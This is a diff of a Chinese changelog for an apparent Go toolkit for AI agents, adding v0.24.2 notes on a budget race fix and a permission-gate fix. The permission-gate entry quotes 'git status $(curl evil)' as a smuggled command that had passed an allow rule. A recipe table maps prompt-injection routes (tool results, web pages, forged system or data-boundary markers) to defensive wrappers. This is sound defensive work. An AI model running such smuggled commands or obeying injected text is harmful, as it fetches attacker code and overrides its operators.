@@ -2,6 +2,44 @@
 
 > 本文件由 `matrix-tools/scripts/gen_changelogs.py` 从 git 历史生成，按 tag 切段、取每段内的 conventional commit 渲染。
 
+## [v0.24.2] — 2026-11-11
+
+### 修复(wire,permgate)：预算惰建并发安全 + 命令替换段 allow 失配（#143 #144）
+
+- #143 Budget.state() 惰性初始化从无锁 check-then-act 改 CAS 单源：并发首笔
+  两个 goroutine 各建一个 budgetState 曾让 b.st 成 data race（-race 必红）且
+  记账分裂、MaxCalls=N 实放约 2N——父侧预算权威（「子进程说了不算」）被
+  并发击穿。atomic.Value 无 LoadOrStore、atomic.Pointer 带 noCopy 破坏
+  Budget 的按值传递语义，故对裸指针字段直接上 atomic 原语（经典 CAS 惰建）。
+  100 并发首笔记账回归钉住「恰好放行 MaxCalls 笔」
+- #144 permgate allow 侧补替换体守门：段内含未引用化的 $(、反引号、${ 时该
+  段恒失配（单引号内为字面；双引号内照样执行/展开不豁免）——git status
+  $(curl evil) 搭 git status:* 的车放行的形态修掉，与「拆不动的形态宁可
+  失配」的包注释承诺对齐；deny/ask 侧保守语义不变；包注释同步如实
+测试按 issue 号命名新增 2 条回归用例；go test -race 全绿。
+
+### 修复(invoke)：投递状态轴（#134）+ 注入场景配方表（#136）
+
+docs(readme): 注入场景配方表——场景→原语→组合查表（#136）
+fence/injectband 的「分工」doc 完整，但「一个具体场景该用哪个（或怎么组合）」
+没有查表答案——消费方要自己读两个包的哲学再拍方案，而拍错的恰是安全面
+（下游 git-ferry 收编时的真实决策链：四条路逐一试错，最终选
+injectband.Wrap 并只能把推理写进注释）。
+在 README「提示注入的两个方向」下新增「常见注入场景配方表」：
+| 场景 | 配方 |
+|---|---|
+| 记忆/系统结论注入对话 | injectband.Wrap(source, body) |
+| 工具结果/外部 agent 产出回填对话 | injectband.Wrap("tool-result:"+id, body)（大段资料先 fence.Data 圈数据区） |
+| 抓取的网页/长文档进 prompt | fence.Data(title, content) 圈数据区 + 外层 injectband.Wrap 声明来源 |
+| 用户输入/LLM 产出嵌入模板渲染面 | fence.EscapeUntrusted 后嵌入 |
+每行附「为什么是这个」：先对伪造方向再选原语——伪造数据区边界标记 →
+fence；伪造系统标记 → injectband；内容自身越权 → EscapeUntrusted。
+另补只措辞声明的反例与 fence.Data 参数序警告。
+表项逐个核对过现有 API（go doc 验证）：injectband.Wrap(source, body)、
+injectband.SanitizeBody（Wrap 内建，不必手转）、fence.Data(title, content)
+（title 在前——issue 正文所写 fence.Data(body, title) 与实际签名相反）、
+fence.EscapeUntrusted(s)。纯文档改动，无新 API。
+
 ## [v0.24.1] — 2026-11-10
 
 ### 修复(scope)：五处 fail-open 口径收口——拆段/词表锚定/json tag/scheme 降级/IPv6 边界（#129 #130 #131 #132 #133）
@@ -178,20 +216,6 @@ pkg v0.38.0（minor 新增，无 API 变更）落地，发版时刻地板时效�
 
 
 ## [v0.23.2] — 2026-11-08
-
-- 杂务(deps)：依赖地板追到最新——github.com/oekit/pkg v0.37.4
-
-| 依赖 | 现地板 | 抬到 |
-|---|---|---|
-| `github.com/oekit/pkg` | `v0.37.3` | `v0.37.4` |
-## 为什么
-矩阵的**发版时刻地板时效**门禁（`verify_tag_floor --ref HEAD`）要求：各仓 HEAD
-（= 下次发版会发出去的内容）的依赖地板，相对那一刻的依赖最新版本，不能已落后。
-oekit 基座与矩阵模块都在高频发版 ⇒ 地板是**跑步机**，落后一格就会判红。
-## 兼容性实测
-本工具在提交前跑完 `go build` / `go vet` / `go test -race -count=1 ./...`（全绿才提交）
-与 `go mod tidy -diff`（无漂移）⇒ 改动**只影响依赖版本**，零行为差异。
-只改 `go.mod` / `go.sum` ⇒ 不需要 CHANGELOG 条目（版本段由下次发版的 `prewrite` 生成）。
 
 - 杂务(deps)：依赖地板追平 oekit BOM v0.2.9——pkg v0.37.4 / logx v0.8.10 / concurrency v0.28.4
 
@@ -1099,20 +1123,6 @@ oekit v0.18.0 的两个发布都是**纯增量**，无破坏性变更：
   **只有一份实现**（此前这类调用方只能自己重写一遍退避，且常丢掉 DelayHint 语义）。
 依据 oagentkit/matrix-tools#44 的还债流程：依赖地板对齐到发版时刻的最新。
 本仓本轮不发 tag（不在发版集内），地板在 main 上就位，下次发版自然带上。
-
-
-- 文档(changelog)：按新生成器规则重生成 CHANGELOG.md
-
-生成器修复（oagentkit/matrix-tools#43）落地：
-① `[round-N] ` 前缀被剥离 → conventional commit 解析不再失效，
-   **commit body 保留**（此前整段被丢弃，发布说明只剩标题）；
-② 非 conventional 提交也保留 body；
-③ `--check` 识别「待发版段」（预写了但还没打 tag 的那段）。
-本 PR 恢复的是**本就在 commit body 里**的正文（迁移步骤、代码块、
-判据锚点）——此前被 `[round-N] ` 前缀导致的解析失败丢弃了。
-**没有任何发布说明内容被删除**：删除的行都能在新增行里找到对应
-（规范化掉 `(#N)` 与 `[round-N] ` 前缀后逐行比对）。
-关联：oagentkit/matrix-tools#43、oagentkit/matrix-tools#40
 
 
 ## [v0.8.2] — 2026-10-20
